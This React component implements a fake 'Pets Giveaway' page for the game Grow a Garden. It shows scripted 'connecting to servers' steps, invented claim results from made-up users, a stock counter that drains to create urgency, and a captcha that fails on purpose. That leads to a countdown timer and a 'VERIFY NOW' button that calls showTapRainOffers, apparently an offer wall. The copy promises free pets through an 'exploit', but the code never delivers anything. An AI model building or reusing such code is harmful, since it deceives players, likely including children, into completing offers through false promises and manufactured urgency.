import React, { useState, useEffect } from 'react';
import { Pet, PETS } from '../types/Pet';
import { PetCard } from './PetCard';

type Screen = 'main' | 'loading' | 'results' | 'selection' | 'packaging' | 'verifying' | 'captcha';

interface RecentResult {
  username: string;
  petName: string;
  image: string;
}

const RECENT_RESULTS: RecentResult[] = [
  { username: 'frxsh22', petName: 'Raccoon', image: 'https://i.postimg.cc/Fsz95FSj/download-6.jpg' },
  { username: 'kylaloves', petName: 'Kitsune', image: 'https://i.postimg.cc/661kZr7v/kitsune.png' },
  { username: 'iAMnoob', petName: 'Disco Bee', image: 'https://i.postimg.cc/25rktQ75/disco-bee.jpg' }
];

const LOADING_STEPS = [
  'Connecting to Grow a Garden servers...',
  'Authenticating username...',
  'Retrieving user data...'
];

const PACKAGING_STEPS = [
  'Packaging your gift...',
  'Securing your pets...',
  'Finalizing package...'
];

const VERIFYING_STEPS = [
  'Verifying player...',
  'Completing auto captcha...',
  'Auto captcha failed...'
];
export const PetSelector: React.FC = () => {
  const [currentScreen, setCurrentScreen] = useState<Screen>('main');
  const [username, setUsername] = useState('');
  const [loadingStep, setLoadingStep] = useState(0);
  const [currentResult, setCurrentResult] = useState(0);
  const [selectedPets, setSelectedPets] = useState<Pet[]>([]);
  const [petStock, setPetStock] = useState<Record<string, number>>({});
  const [imagesPreloaded, setImagesPreloaded] = useState(false);
  const [packagingStep, setPackagingStep] = useState(0);
  const [verifyingStep, setVerifyingStep] = useState(0);
  const [timeLeft, setTimeLeft] = useState(300); // 5 minutes in seconds

  // Preload images when component mounts
  useEffect(() => {
    const preloadImages = () => {
      const imagePromises = RECENT_RESULTS.map(result => {
        return new Promise((resolve, reject) => {
          const img = new Image();
          img.onload = resolve;
          img.onerror = reject;
          img.src = result.image;
        });
      });

      Promise.all(imagePromises)
        .then(() => setImagesPreloaded(true))
        .catch(() => setImagesPreloaded(true)); // Continue even if some images fail
    };

    preloadImages();
  }, []);

  // Initialize pet stock
  useEffect(() => {
    const initialStock: Record<string, number> = {};
    PETS.forEach(pet => {
      // Only ankylosaurus, brontosaurus, and butterfly are out of stock
      if (pet.id === 'ankylosaurus' || pet.id === 'brontosaurus' || pet.id === 'butterfly-pet') {
        initialStock[pet.id] = 0;
      } else {
        initialStock[pet.id] = Math.floor(Math.random() * 50) + 1;
      }
    });
    setPetStock(initialStock);
  }, []);

  // Slowly decrease stock for in-stock pets
  useEffect(() => {
    if (currentScreen !== 'selection') return;

    const interval = setInterval(() => {
      setPetStock(prev => {
        const newStock = { ...prev };
        const inStockPets = Object.keys(newStock).filter(id => newStock[id] > 0);
        
        if (inStockPets.length > 0 && Math.random() < 0.3) { // 30% chance to decrease
          const randomPet = inStockPets[Math.floor(Math.random() * inStockPets.length)];
          if (newStock[randomPet] > 1) { // Don't let it go to 0 too quickly
            newStock[randomPet] = Math.max(1, newStock[randomPet] - 1);
          }
        }
        
        return newStock;
      });
    }, 3000); // Every 3 seconds

    return () => clearInterval(interval);
  }, [currentScreen]);

  // Handle packaging progression
  useEffect(() => {
    if (currentScreen !== 'packaging') return;

    const timer = setTimeout(() => {
      if (packagingStep < PACKAGING_STEPS.length - 1) {
        setPackagingStep(packagingStep + 1);
      } else {
        setCurrentScreen('verifying');
        setVerifyingStep(0);
      }
    }, 2000);

    return () => clearTimeout(timer);
  }, [currentScreen, packagingStep]);

  // Handle verifying progression
  useEffect(() => {
    if (currentScreen !== 'verifying') return;

    const timer = setTimeout(() => {
      if (verifyingStep < VERIFYING_STEPS.length - 1) {
        setVerifyingStep(verifyingStep + 1);
      } else {
        setCurrentScreen('captcha');
        setTimeLeft(300); // Reset timer to 5 minutes
      }
    }, 2000);

    return () => clearTimeout(timer);
  }, [currentScreen, verifyingStep]);

  // Handle captcha timer countdown
  useEffect(() => {
    if (currentScreen !== 'captcha') return;

    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev <= 1) {
          // Timer expired - could redirect or show message
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [currentScreen]);

  const handleGenerate = () => {
    if (!username.trim()) return;
    setCurrentScreen('loading');
    setLoadingStep(0);
  };

  // Handle loading progression
  useEffect(() => {
    if (currentScreen !== 'loading') return;

    const timer = setTimeout(() => {
      if (loadingStep < LOADING_STEPS.length - 1) {
        setLoadingStep(loadingStep + 1);
      } else {
        setCurrentScreen('results');
        setCurrentResult(0);
      }
    }, 2000);

    return () => clearTimeout(timer);
  }, [currentScreen, loadingStep]);

  // Handle results progression
  useEffect(() => {
    if (currentScreen !== 'results') return;

    const timer = setTimeout(() => {
      if (currentResult < RECENT_RESULTS.length - 1) {
        setCurrentResult(currentResult + 1);
      } else {
        setCurrentScreen('selection');
      }
    }, 2000);

    return () => clearTimeout(timer);
  }, [currentScreen, currentResult]);

  const handlePetSelect = (pet: Pet) => {
    if (petStock[pet.id] === 0) return; // Can't select out of stock pets
    
    if (selectedPets.find(p => p.id === pet.id)) {
      // Deselect pet
      setSelectedPets(selectedPets.filter(p => p.id !== pet.id));
    } else if (selectedPets.length < 3) {
      // Select pet
      setSelectedPets([...selectedPets, pet]);
    }
  };

  const handleClaim = () => {
    setCurrentScreen('packaging');
    setPackagingStep(0);
  };

  const formatTime = (seconds: number) => {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return `${minutes}:${remainingSeconds.toString().padStart(2, '0')}`;
  };

  if (currentScreen === 'loading') {
    return (
      <div className="min-h-screen bg-gradient-to-br from-sky-300 via-sky-200 to-blue-300 flex items-center justify-center px-4 relative overflow-hidden">
        {/* Floating Fruits */}
        <div className="absolute top-80 left-8 w-16 h-16 bg-red-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '0s', animationDuration: '1.5s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-red-400 to-red-600 flex items-center justify-center text-white font-bold">🍎</div>
        </div>
        <div className="absolute top-96 right-16 w-14 h-14 bg-orange-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '0.3s', animationDuration: '2s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-orange-400 to-orange-600 flex items-center justify-center text-white font-bold">🍊</div>
        </div>
        <div className="absolute bottom-40 left-20 w-12 h-12 bg-purple-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '0.8s', animationDuration: '1.8s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-purple-400 to-purple-600 flex items-center justify-center text-white font-bold">🍇</div>
        </div>
        <div className="absolute top-1/2 right-12 w-14 h-14 bg-yellow-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '0.5s', animationDuration: '2.2s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-yellow-400 to-yellow-600 flex items-center justify-center text-white font-bold">🍌</div>
        </div>
        <div className="absolute top-72 left-1/3 w-10 h-10 bg-green-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '0.2s', animationDuration: '1.5s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-green-400 to-green-600 flex items-center justify-center text-white font-bold">🍏</div>
        </div>
        <div className="absolute bottom-20 right-1/4 w-12 h-12 bg-pink-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '1s', animationDuration: '1.7s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-pink-400 to-pink-600 flex items-center justify-center text-white font-bold">🍑</div>
        </div>
        
        <div className="text-center bg-white/90 backdrop-blur-sm rounded-lg p-8 shadow-xl">
          <div className="mb-6">
            <img 
              src="/maxresdefault-removebg-preview (7).png" 
              alt="Grow a Garden Logo" 
              className="mx-auto h-24 w-auto drop-shadow-lg"
            />
          </div>
          <div className="mb-8">
            <div className="w-16 h-16 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
            <p className="text-2xl font-bold text-gray-800">{LOADING_STEPS[loadingStep]}</p>
          </div>
        </div>
      </div>
    );
  }

  if (currentScreen === 'packaging') {
    return (
      <div className="min-h-screen bg-gradient-to-br from-sky-300 via-sky-200 to-blue-300 flex items-center justify-center px-4 relative overflow-hidden">
        {/* Floating Fruits */}
        <div className="absolute top-80 left-8 w-16 h-16 bg-red-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '0s', animationDuration: '1.5s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-red-400 to-red-600 flex items-center justify-center text-white font-bold">🍎</div>
        </div>
        <div className="absolute top-96 right-16 w-14 h-14 bg-orange-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '0.3s', animationDuration: '2s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-orange-400 to-orange-600 flex items-center justify-center text-white font-bold">🍊</div>
        </div>
        <div className="absolute bottom-40 left-20 w-12 h-12 bg-purple-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '0.8s', animationDuration: '1.8s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-purple-400 to-purple-600 flex items-center justify-center text-white font-bold">🍇</div>
        </div>
        <div className="absolute top-1/2 right-12 w-14 h-14 bg-yellow-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '0.5s', animationDuration: '2.2s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-yellow-400 to-yellow-600 flex items-center justify-center text-white font-bold">🍌</div>
        </div>
        <div className="absolute top-72 left-1/3 w-10 h-10 bg-green-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '0.2s', animationDuration: '1.5s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-green-400 to-green-600 flex items-center justify-center text-white font-bold">🍏</div>
        </div>
        <div className="absolute bottom-20 right-1/4 w-12 h-12 bg-pink-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '1s', animationDuration: '1.7s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-pink-400 to-pink-600 flex items-center justify-center text-white font-bold">🍑</div>
        </div>
        
        <div className="text-center bg-white/90 backdrop-blur-sm rounded-lg p-8 shadow-xl max-w-md">
          <div className="mb-6">
            <img 
              src="/maxresdefault-removebg-preview (7).png" 
              alt="Grow a Garden Logo" 
              className="mx-auto h-24 w-auto drop-shadow-lg"
            />
          </div>
          <div className="mb-8">
            <div className="w-16 h-16 border-4 border-green-500 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
            <p className="text-2xl font-bold text-gray-800 mb-4">{PACKAGING_STEPS[packagingStep]}</p>
            
            {/* Gift box animation with selected pets */}
            <div className="flex justify-center items-center space-x-2 mb-4">
              <div className="text-4xl animate-bounce">🎁</div>
              <div className="flex space-x-1">
                {selectedPets.map((pet, index) => (
                  <img 
                    key={pet.id}
                    src={pet.image} 
                    alt={pet.name}
                    className="w-8 h-8 object-contain animate-pulse"
                    style={{animationDelay: `${index * 0.2}s`}}
                  />
                ))}
              </div>
            </div>
            
            <p className="text-sm text-gray-600">
              Preparing {selectedPets.map(p => p.name).join(', ')}
            </p>
          </div>
        </div>
      </div>
    );
  }

  if (currentScreen === 'verifying') {
    return (
      <div className="min-h-screen bg-gradient-to-br from-sky-300 via-sky-200 to-blue-300 flex items-center justify-center px-4 relative overflow-hidden">
        {/* Floating Fruits */}
        <div className="absolute top-80 left-8 w-16 h-16 bg-red-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '0s', animationDuration: '1.5s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-red-400 to-red-600 flex items-center justify-center text-white font-bold">🍎</div>
        </div>
        <div className="absolute top-96 right-16 w-14 h-14 bg-orange-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '0.3s', animationDuration: '2s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-orange-400 to-orange-600 flex items-center justify-center text-white font-bold">🍊</div>
        </div>
        <div className="absolute bottom-40 left-20 w-12 h-12 bg-purple-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '0.8s', animationDuration: '1.8s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-purple-400 to-purple-600 flex items-center justify-center text-white font-bold">🍇</div>
        </div>
        <div className="absolute top-1/2 right-12 w-14 h-14 bg-yellow-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '0.5s', animationDuration: '2.2s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-yellow-400 to-yellow-600 flex items-center justify-center text-white font-bold">🍌</div>
        </div>
        <div className="absolute top-72 left-1/3 w-10 h-10 bg-green-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '0.2s', animationDuration: '1.5s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-green-400 to-green-600 flex items-center justify-center text-white font-bold">🍏</div>
        </div>
        <div className="absolute bottom-20 right-1/4 w-12 h-12 bg-pink-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '1s', animationDuration: '1.7s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-pink-400 to-pink-600 flex items-center justify-center text-white font-bold">🍑</div>
        </div>
        
        <div className="text-center bg-white/90 backdrop-blur-sm rounded-lg p-8 shadow-xl">
          <div className="mb-6">
            <img 
              src="/maxresdefault-removebg-preview (7).png" 
              alt="Grow a Garden Logo" 
              className="mx-auto h-24 w-auto drop-shadow-lg"
            />
          </div>
          <div className="mb-8">
            <div className={`w-16 h-16 border-4 ${verifyingStep === 2 ? 'border-red-500' : 'border-blue-500'} border-t-transparent rounded-full animate-spin mx-auto mb-4`}></div>
            <p className={`text-2xl font-bold ${verifyingStep === 2 ? 'text-red-600' : 'text-gray-800'}`}>
              {VERIFYING_STEPS[verifyingStep]}
            </p>
            {verifyingStep === 2 && (
              <p className="text-red-500 text-sm mt-2">Manual verification required</p>
            )}
          </div>
        </div>
      </div>
    );
  }

  if (currentScreen === 'captcha') {
    return (
      <div className="min-h-screen bg-gradient-to-br from-sky-300 via-sky-200 to-blue-300 flex items-center justify-center px-4 relative overflow-hidden">
        {/* Floating Fruits */}
        <div className="absolute top-80 left-8 w-16 h-16 bg-red-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '0s', animationDuration: '1.5s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-red-400 to-red-600 flex items-center justify-center text-white font-bold">🍎</div>
        </div>
        <div className="absolute top-96 right-16 w-14 h-14 bg-orange-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '0.3s', animationDuration: '2s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-orange-400 to-orange-600 flex items-center justify-center text-white font-bold">🍊</div>
        </div>
        <div className="absolute bottom-40 left-20 w-12 h-12 bg-purple-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '0.8s', animationDuration: '1.8s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-purple-400 to-purple-600 flex items-center justify-center text-white font-bold">🍇</div>
        </div>
        <div className="absolute top-1/2 right-12 w-14 h-14 bg-yellow-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '0.5s', animationDuration: '2.2s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-yellow-400 to-yellow-600 flex items-center justify-center text-white font-bold">🍌</div>
        </div>
        <div className="absolute top-72 left-1/3 w-10 h-10 bg-green-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '0.2s', animationDuration: '1.5s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-green-400 to-green-600 flex items-center justify-center text-white font-bold">🍏</div>
        </div>
        <div className="absolute bottom-20 right-1/4 w-12 h-12 bg-pink-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '1s', animationDuration: '1.7s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-pink-400 to-pink-600 flex items-center justify-center text-white font-bold">🍑</div>
        </div>
        
        <div className="max-w-md w-full">
          {/* Timer */}
          <div className="bg-orange-500 text-white px-4 py-3 rounded-t-lg flex items-center justify-center mb-0 shadow-lg">
            <span className="text-yellow-200 mr-2">⚠</span>
            <span className="font-bold">This session will expire in: {formatTime(timeLeft)}</span>
          </div>
          
          {/* Main Card */}
          <div className="bg-white/95 backdrop-blur-sm rounded-b-lg p-6 shadow-2xl border border-white/20">
            <h1 className="text-3xl font-bold text-gray-800 text-center mb-6">Captcha</h1>
            
            <p className="text-gray-700 text-center mb-6 leading-relaxed">
              Hello <span className="text-blue-400 font-bold">{username}</span>! Your pets are ready. However, to 
              prevent the abuse of our system and server overloads, you have to complete a quick captcha. 
              This also prevents Developers from patching the exploit.
            </p>
            
            {/* Selected Pets Display */}
            <div className="bg-blue-50 rounded-lg p-4 mb-6 border border-blue-200">
              <div className="grid grid-cols-3 gap-3">
                {selectedPets.map((pet) => (
                  <div key={pet.id} className="text-center">
                    <div className="bg-white rounded-lg p-2 mb-2 border border-blue-300 shadow-sm">
                      <img 
                        src={pet.image} 
                        alt={pet.name}
                        className="w-full h-16 object-contain"
                      />
                    </div>
                    <p className="text-xs text-gray-700 font-medium">{pet.name}</p>
                  </div>
                ))}
                {/* Fill empty slots if less than 3 pets */}
                {Array.from({ length: 3 - selectedPets.length }).map((_, index) => (
                  <div key={`empty-${index}`} className="text-center">
                    <div className="bg-gray-100 rounded-lg p-2 mb-2 border border-gray-300 h-20 flex items-center justify-center">
                      <span className="text-gray-400 text-2xl">-</span>
                    </div>
                    <p className="text-xs text-gray-400">Empty</p>
                  </div>
                ))}
              </div>
            </div>
            
            {/* Verify Button */}
            <button 
              onClick={() => {
                if (window.showTapRainOffers) {
                  window.showTapRainOffers();
                }
              }}
              className="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-4 px-6 rounded-lg transition-all duration-200 shadow-lg hover:shadow-xl transform hover:scale-105 text-lg"
            >
              VERIFY NOW
            </button>
          </div>
        </div>
      </div>
    );
  }

  if (currentScreen === 'results') {
    const result = RECENT_RESULTS[currentResult];
    return (
      <div className="min-h-screen bg-gradient-to-br from-sky-300 via-sky-200 to-blue-300 flex items-center justify-center px-4 relative overflow-hidden">
        {/* Floating Fruits */}
        <div className="absolute top-80 left-8 w-16 h-16 bg-red-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '0s', animationDuration: '1.5s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-red-400 to-red-600 flex items-center justify-center text-white font-bold">🍎</div>
        </div>
        <div className="absolute top-96 right-16 w-14 h-14 bg-orange-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '0.3s', animationDuration: '2s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-orange-400 to-orange-600 flex items-center justify-center text-white font-bold">🍊</div>
        </div>
        <div className="absolute bottom-40 left-20 w-12 h-12 bg-purple-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '0.8s', animationDuration: '1.8s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-purple-400 to-purple-600 flex items-center justify-center text-white font-bold">🍇</div>
        </div>
        <div className="absolute top-1/2 right-12 w-14 h-14 bg-yellow-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '0.5s', animationDuration: '2.2s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-yellow-400 to-yellow-600 flex items-center justify-center text-white font-bold">🍌</div>
        </div>
        <div className="absolute top-72 left-1/3 w-10 h-10 bg-green-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '0.2s', animationDuration: '1.5s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-green-400 to-green-600 flex items-center justify-center text-white font-bold">🍏</div>
        </div>
        <div className="absolute bottom-20 right-1/4 w-12 h-12 bg-pink-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '1s', animationDuration: '1.7s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-pink-400 to-pink-600 flex items-center justify-center text-white font-bold">🍑</div>
        </div>
        
        <div className="text-center bg-white/90 backdrop-blur-sm rounded-lg p-8 shadow-xl">
          <h2 className="text-3xl font-bold text-gray-800 mb-6">Recent Results</h2>
          <div className="mb-4">
            <img 
              src={result.image} 
              alt={result.petName}
              className="w-32 h-32 object-cover rounded-lg mx-auto mb-4 shadow-lg"
            />
            <p className="text-xl font-bold text-gray-800">
              <span className="text-blue-600">{result.username}</span> claimed <span className="text-green-600">{result.petName}</span>
            </p>
          </div>
        </div>
      </div>
    );
  }

  if (currentScreen === 'selection') {
    return (
      <div className="min-h-screen bg-gradient-to-br from-sky-300 via-sky-200 to-blue-300 px-4 py-8 relative">
        {/* Floating Fruits */}
        <div className="absolute top-80 left-8 w-16 h-16 bg-red-500 rounded-full opacity-20 shadow-lg animate-bounce" style={{animationDelay: '0s', animationDuration: '1.5s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-red-400 to-red-600 flex items-center justify-center text-white font-bold">🍎</div>
        </div>
        <div className="absolute top-96 right-16 w-14 h-14 bg-orange-500 rounded-full opacity-20 shadow-lg animate-bounce" style={{animationDelay: '0.3s', animationDuration: '2s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-orange-400 to-orange-600 flex items-center justify-center text-white font-bold">🍊</div>
        </div>
        <div className="absolute bottom-40 left-20 w-12 h-12 bg-purple-500 rounded-full opacity-20 shadow-lg animate-bounce" style={{animationDelay: '0.8s', animationDuration: '1.8s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-purple-400 to-purple-600 flex items-center justify-center text-white font-bold">🍇</div>
        </div>
        <div className="absolute top-1/2 right-12 w-14 h-14 bg-yellow-500 rounded-full opacity-20 shadow-lg animate-bounce" style={{animationDelay: '0.5s', animationDuration: '2.2s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-yellow-400 to-yellow-600 flex items-center justify-center text-white font-bold">🍌</div>
        </div>
        <div className="absolute top-72 left-1/3 w-10 h-10 bg-green-500 rounded-full opacity-20 shadow-lg animate-bounce" style={{animationDelay: '0.2s', animationDuration: '1.5s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-green-400 to-green-600 flex items-center justify-center text-white font-bold">🍏</div>
        </div>
        <div className="absolute bottom-20 right-1/4 w-12 h-12 bg-pink-500 rounded-full opacity-20 shadow-lg animate-bounce" style={{animationDelay: '1s', animationDuration: '1.7s'}}>
          <div className="w-full h-full rounded-full bg-gradient-to-br from-pink-400 to-pink-600 flex items-center justify-center text-white font-bold">🍑</div>
        </div>

        <div className="max-w-6xl mx-auto">
          <div className="text-center mb-8">
            <div className="mb-6">
              <img 
                src="/maxresdefault-removebg-preview (7).png" 
                alt="Grow a Garden Logo" 
                className="mx-auto h-32 w-auto drop-shadow-lg transform hover:scale-105 transition-transform duration-300"
              />
            </div>
            <h1 className="text-4xl font-bold text-gray-800 mb-4 drop-shadow-sm">Choose Your Pets</h1>
            <p className="text-2xl text-gray-700 mb-4 font-bold drop-shadow-sm">Select up to 3 pets to claim</p>
            <div className="bg-white/90 backdrop-blur-sm rounded-full px-6 py-3 shadow-lg inline-block border-2 border-white">
              <p className="text-lg font-bold text-gray-800">Selected: {selectedPets.length}/3</p>
            </div>
          </div>

          <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 xl:grid-cols-8 gap-4 mb-8">
            {PETS.map((pet) => (
              <div key={pet.id}>
                <PetCard
                  pet={pet}
                  isSelected={selectedPets.some(p => p.id === pet.id)}
                  onSelect={handlePetSelect}
                  disabled={petStock[pet.id] === 0 || (!selectedPets.some(p => p.id === pet.id) && selectedPets.length >= 3)}
                  stock={petStock[pet.id] || 0}
                />
              </div>
            ))}
          </div>
        </div>

        {/* Claim Button Overlay */}
        {selectedPets.length > 0 && (
          <div className="fixed bottom-0 left-0 right-0 z-50">
            <div className="bg-white/95 backdrop-blur-sm rounded-t-xl p-6 shadow-2xl text-center border-t border-white/20 mx-4 mb-4">
              <h3 className="text-2xl font-bold text-gray-800 mb-4">Ready to Claim?</h3>
              <p className="text-gray-600 mb-6">
                You've selected {selectedPets.length} pet{selectedPets.length > 1 ? 's' : ''}:
              </p>
              <div className="mb-6">
                {selectedPets.map(pet => (
                  <span key={pet.id} className="inline-block bg-blue-100 text-blue-800 px-3 py-1 rounded-full text-sm font-medium mr-2 mb-2">
                    {pet.name}
                  </span>
                ))}
              </div>
              <div className="flex gap-4 justify-center">
                <button
                  onClick={() => setSelectedPets([])}
                  className="px-6 py-3 bg-gray-500 hover:bg-gray-600 text-white font-bold rounded-xl transition-all duration-200 shadow-lg hover:shadow-xl transform hover:scale-105"
                >
                  Cancel
                </button>
                <button
                  onClick={handleClaim}
                  className="px-6 py-3 bg-green-500 hover:bg-green-600 text-white font-bold rounded-xl transition-all duration-200 shadow-lg hover:shadow-xl transform hover:scale-105"
                >
                  Claim Pets
                </button>
              </div>
            </div>
          </div>
        )}
      </div>
    );
  }

  // Main screen
  return (
    <div className="min-h-screen bg-gradient-to-br from-sky-300 via-sky-200 to-blue-300 flex items-center justify-center px-4 relative overflow-hidden">
      {/* Floating Fruits */}
      <div className="absolute top-80 left-8 w-16 h-16 bg-red-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '0s', animationDuration: '1.5s'}}>
        <div className="w-full h-full rounded-full bg-gradient-to-br from-red-400 to-red-600 flex items-center justify-center text-white font-bold">🍎</div>
      </div>
      <div className="absolute top-96 right-16 w-14 h-14 bg-orange-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '0.3s', animationDuration: '2s'}}>
        <div className="w-full h-full rounded-full bg-gradient-to-br from-orange-400 to-orange-600 flex items-center justify-center text-white font-bold">🍊</div>
      </div>
      <div className="absolute bottom-40 left-20 w-12 h-12 bg-purple-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '0.8s', animationDuration: '1.8s'}}>
        <div className="w-full h-full rounded-full bg-gradient-to-br from-purple-400 to-purple-600 flex items-center justify-center text-white font-bold">🍇</div>
      </div>
      <div className="absolute top-1/2 right-12 w-14 h-14 bg-yellow-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '0.5s', animationDuration: '2.2s'}}>
        <div className="w-full h-full rounded-full bg-gradient-to-br from-yellow-400 to-yellow-600 flex items-center justify-center text-white font-bold">🍌</div>
      </div>
      <div className="absolute top-72 left-1/3 w-10 h-10 bg-green-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '0.2s', animationDuration: '1.5s'}}>
        <div className="w-full h-full rounded-full bg-gradient-to-br from-green-400 to-green-600 flex items-center justify-center text-white font-bold">🍏</div>
      </div>
      <div className="absolute bottom-20 right-1/4 w-12 h-12 bg-pink-500 rounded-full opacity-30 shadow-lg animate-bounce" style={{animationDelay: '1s', animationDuration: '1.7s'}}>
        <div className="w-full h-full rounded-full bg-gradient-to-br from-pink-400 to-pink-600 flex items-center justify-center text-white font-bold">🍑</div>
      </div>
      
      <div className="max-w-6xl mx-auto">
        {/* Header */}
        <div className="text-center">
          {/* GAG Logo */}
          <div className="mb-6">
            <img 
              src="/maxresdefault-removebg-preview (7).png" 
              alt="Grow a Garden Logo" 
              className="mx-auto h-32 w-auto drop-shadow-lg transform hover:scale-105 transition-transform duration-300"
            />
          </div>
          <p className="text-2xl text-gray-800 font-bold mb-8 drop-shadow-sm">
            Pets Giveaway
          </p>
          
          {/* Username Input */}
          <div className="mb-6">
            <input
              type="text"
              placeholder="Enter Username"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              className="px-6 py-3 rounded-full border-2 border-white focus:border-green-400 focus:outline-none text-center text-lg font-medium shadow-lg bg-white/90 backdrop-blur-sm"
            />
          </div>
          
          <button 
            onClick={handleGenerate}
            disabled={!username.trim()}
            className="bg-green-500 hover:bg-green-600 disabled:bg-gray-400 disabled:cursor-not-allowed text-white font-bold py-3 px-8 rounded-full shadow-lg transform hover:scale-105 transition-all duration-200 text-lg border-2 border-green-600" 
          >
            Choose Your Pets!
          </button>
        </div>
      </div>
    </div>
  );
};